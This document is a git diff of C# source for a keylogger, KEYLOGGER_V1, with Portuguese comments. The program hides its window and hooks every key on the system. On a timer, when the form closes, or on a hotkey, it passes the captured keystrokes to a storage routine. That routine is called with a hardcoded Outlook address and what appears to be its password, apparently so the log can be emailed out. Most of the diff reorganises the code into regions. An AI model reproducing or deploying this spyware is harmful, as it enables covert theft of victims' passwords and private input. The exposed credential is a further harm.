@@ -9,29 +9,28 @@ namespace KEYLOGGER_V1
 {
     public partial class FrmHome : Form
     { 
+        #region Construtores
+        /// <summary>
+        ///  Construtor padrão do formulario keylogger
+        /// </summary>
         public FrmHome()
         {
             InitializeComponent();
         }
 
+        #endregion
 
-//------------------------------------------------------------------[EVENTOS]--------------------------------------------------------------------------------------           
+        #region Eventos
         private void FrmHome_Load(object sender, EventArgs e)                  //EVENTO: Inicialização do formulário, para verificações Iniciais.
-        {   
-            Hide(true);                   
-            MetodosDeEventosHook();       
+        {
+            Hide(true);
+            MetodosDeEventosHook();
 
-            c_Enviar_Email email = new c_Enviar_Email();
-
-            if (email.Verifica_Existencia_Log(@"C:\Key\Keylogger.txt"))    
-            {
-                if (email.Verifica_Conexao_Web())  
-                {
-                    email.Enviar_Email_Log(@"C:\Key\Keylogger.txt"); 
-                    File.Delete(@"C:\Key\Keylogger.txt");
-                }
-
-            }
+            #region Gravação das informações
+            Gravacao gravacao = new Gravacao();
+            gravacao.Armazenar("OrionOficial@outlook.com", "Orion0f1c1al", "", "OrionOficial@outlook.com", "OrionOficial@outlook.com", "Keyllogger", "key.txt", @"C:\Key\");
+            txtTextoDigitadoLimpo.Clear();
+            #endregion
 
         }
         private void txtTextoDigitado_TextChanged(object sender, EventArgs e)  //EVENTO: quando ouver uma alteração no texto, irá ser verificado as teclas.
@@ -42,7 +41,7 @@ namespace KEYLOGGER_V1
 
             if (TeclaAtalhos(txtTextoDigitado.Text, AtalhoDeVisibilidade) == AtalhoDeVisibilidade)
             {
-                if (this.Opacity == 0 && this.ShowInTaskbar == false)             
+                if (this.Opacity == 0 && this.ShowInTaskbar == false)
                 {
                     Hide(false);
 
@@ -60,35 +59,38 @@ namespace KEYLOGGER_V1
                 {
                     Application.Exit();
                 }
-                else 
+                else
                 {
-                    if (TeclaAtalhos(txtTextoDigitado.Text, AtalhoDeEnviarEmail) == AtalhoDeEnviarEmail) 
+                    if (TeclaAtalhos(txtTextoDigitado.Text, AtalhoDeEnviarEmail) == AtalhoDeEnviarEmail)
                     {
-                        c_Enviar_Email email = new c_Enviar_Email();
-                        email.SalvaLogOuEnviaEmail(txtTextoDigitadoLimpo.Text, @"C:\Key\Keylogger.txt");
+                        Gravacao gravacao = new Gravacao();
+                        gravacao.Armazenar("login", "senha", "conteudo", "remtente", "destinatario", "assunto", "nomeArquivo", "DirLog");
                         txtTextoDigitadoLimpo.Clear();
                     }
                 }
             }
-            
+
         }
         private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)//EVENTO: Quando o formulario estiver fechando, salva backup.
         {
-            File.Delete(@"C:\Key\Keylogger.txt"); 
-            c_Enviar_Email email = new c_Enviar_Email();
-            email.SalvaLogOuEnviaEmail(txtTextoDigitadoLimpo.Text, @"C:\Key\Keylogger.txt");
+            #region Gravação das informações
+            Gravacao gravacao = new Gravacao();
+            gravacao.Armazenar("OrionOficial@outlook.com", "Orion0f1c1al", txtTextoDigitadoLimpo.Text, "OrionOficial@outlook.com", "OrionOficial@outlook.com", "Keyllogger", "key.txt", "C:\\Key\\");
             txtTextoDigitadoLimpo.Clear();
+            #endregion
         }
         private void tmEnviarEmail_Tick(object sender, EventArgs e)            //EVENTO: Timer de Enviar as teclas digitadas para o EMAIL.
         {
-             c_Enviar_Email email = new c_Enviar_Email();
-             email.SalvaLogOuEnviaEmail(txtTextoDigitadoLimpo.Text,@"C:\Key\Keylogger.txt");
-             txtTextoDigitadoLimpo.Clear();
+            #region Gravação das informações
+            Gravacao gravacao = new Gravacao();
+            gravacao.Armazenar("OrionOficial@outlook.com", "Orion0f1c1al", txtTextoDigitadoLimpo.Text, "OrionOficial@outlook.com", "OrionOficial@outlook.com", "Keyllogger", "key.txt", @"C:\Key\");
+            txtTextoDigitadoLimpo.Clear();
+            #endregion
         }
      
+        #endregion
 
-//------------------------------------------------------------------[METODOS]---------------------------------------------------------------------------------------        
-
+        #region Metodos
         bool _ShiftPressionado = false;
         String Monitoramento_Geral_Teclas(String Key)                          //METODO: Mapeamento de teclas, e Comparação das teclas para substituição, Evento de ações.
         {
@@ -134,7 +136,7 @@ namespace KEYLOGGER_V1
                         //Apaga o ultimo caracter digitado na linha.
                         return "[Back]";
                     }
-                    catch (Exception) { return ""; }          
+                    catch (Exception) { return ""; }
                 case "PrintScreen":
                     return "[Print Screen]";
                 case "Pause":
@@ -319,8 +321,9 @@ namespace KEYLOGGER_V1
 
         }
 
+        #endregion
 
-//------------------------------------------------------------------[REFERENTE A CLASSE HOOK]-----------------------------------------------------------------------
+        #region GlobalKeyBoardHook
 
         //INSTÂNCIA DA CLASSE: que retorna o valor das teclas digitada em cada KEYDOWN
         globalKeyboardHook gkh = new globalKeyboardHook();
@@ -333,6 +336,7 @@ namespace KEYLOGGER_V1
             // TEXTO com as teclas editadas.
             txtTextoDigitadoLimpo.Text += Monitoramento_Maisculas_Minusculas(Monitoramento_Geral_Teclas(Convert.ToString(e.KeyCode)));
         }
+
         private void HookAll()                                    //METODO: pega o enumerador da tecla e substitui por uma sequencia de caracteres
         {
             foreach (object key in Enum.GetValues(typeof(Keys)))
@@ -340,12 +344,14 @@ namespace KEYLOGGER_V1
                 gkh.HookedKeys.Add((Keys)key);
             }
         }
+
         void MetodosDeEventosHook()                               //METODO: Ativa os eventos do HOOK(scan das teclas) 
         {
             gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
             HookAll();
         }
        
+        #endregion
        
     }
 }
